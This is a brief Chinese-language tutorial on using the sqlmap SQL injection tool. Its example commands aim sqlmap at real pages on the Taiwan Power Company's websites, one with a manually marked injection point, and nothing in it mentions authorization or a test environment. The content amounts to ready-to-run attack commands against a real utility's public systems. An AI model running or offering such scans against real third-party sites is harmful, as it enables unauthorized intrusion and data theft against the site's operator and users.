# 如何使用 sqlmap

### 檢查 sqlmap 有沒有安裝
```sh
sqlmap --version
```

### 指定目標
```sh
sqlmap -u "https://www.taipower.com.tw/TC/page.aspx?mid=44"
```

### 手動指定參數位置，後面加*
```sh
sqlmap -u "https://iest.taipower.com.tw/Home/PublicationDetail/32*"
```
